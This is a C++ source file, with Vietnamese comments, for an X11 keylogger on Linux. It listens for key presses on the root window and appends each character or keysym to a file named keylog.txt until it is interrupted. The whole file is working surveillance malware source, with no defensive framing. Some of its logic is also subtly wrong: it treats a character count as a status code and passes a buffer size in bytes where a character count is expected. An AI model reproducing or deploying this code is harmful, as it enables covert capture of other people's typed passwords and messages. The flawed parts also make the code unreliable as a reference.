#include <iostream>
#include <fstream>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/extensions/XTest.h>
#include <unistd.h>
#include <X11/Xutil.h>
#include <X11/Xlocale.h>

using namespace std;

// Biến toàn cục để quản lý file và kết nối X
ofstream logFile;
Display* display = nullptr;

// Biến flag để kiểm tra nếu X display đã được mở
bool displayOpen = false;

// Hàm cleanup được gọi khi tín hiệu Ctrl+C (SIGINT) được nhận
void cleanup(int signum) {
    if (logFile.is_open()) {
        logFile.close();
    }
    cout << "Cleanup " << endl;
    // Đảm bảo chỉ gọi XCloseDisplay khi display đã được mở
    if (displayOpen && display) {
        XCloseDisplay(display);
        displayOpen = false;  // Đặt lại trạng thái display
    }

    cout << "Cleanup hoàn tất. Chương trình sẽ thoát." << endl;
    exit(0);  // Kết thúc chương trình
}

// Hàm ghi các phím nhấn vào file
void logKeyPresses() {
    // Mở file để ghi
    logFile.open("keylog.txt", ios::app);
    if (!logFile.is_open()) {
        cerr << "Không thể mở file!" << endl;
        return;
    }

    // Mở kết nối với X server
    display = XOpenDisplay(nullptr);
    if (!display) {
        cerr << "Không thể kết nối với X server!" << endl;
        return;
    }

    displayOpen = true;  // Đánh dấu rằng display đã được mở

    // Đảm bảo chỉ thu thập sự kiện từ một màn hình
    Window rootWindow = DefaultRootWindow(display);

    // Thiết lập XIC (Input Context) cho việc tra cứu chuỗi
    XIC xic = XCreateIC(XOpenIM(display, nullptr, nullptr, nullptr), XNInputStyle, XIMPreeditNothing | XIMStatusNothing, XNClientWindow, rootWindow, nullptr);
    if (!xic) {
        cerr << "Không thể tạo XIC!" << endl;
        return;
    }

    // Theo dõi sự kiện bàn phím
    XSelectInput(display, rootWindow, KeyPressMask);

    // Vòng lặp vô hạn để theo dõi các phím nhấn
    XEvent event;
    while (true) {
        XNextEvent(display, &event);

        // Kiểm tra xem sự kiện có phải là phím được nhấn hay không
        if (event.xkey.type == KeyPress) {
            wchar_t buffer[32];
            KeySym keysym;
            Status status = XwcLookupString(xic, &event.xkey, buffer, sizeof(buffer), &keysym, nullptr);

            if (status == Success && buffer[0] != L'\0') {
                logFile << buffer[0];  // Ghi ký tự vào file
                logFile.flush();
            } else {
                // Ghi các phím đặc biệt như Shift, Ctrl, Alt
                logFile << "[" << keysym << "]";
                logFile.flush();
            }
        }

        // Tạm dừng một chút để không chiếm hết tài nguyên CPU
        usleep(10000);  // Tạm dừng 10ms
    }

    // Đóng XIC
    XDestroyIC(xic);
}

int main() {
    // Đăng ký xử lý tín hiệu Ctrl+C (SIGINT)
    signal(SIGINT, cleanup);

    // Chạy hàm theo dõi phím
    logKeyPresses();
    return 0;
}
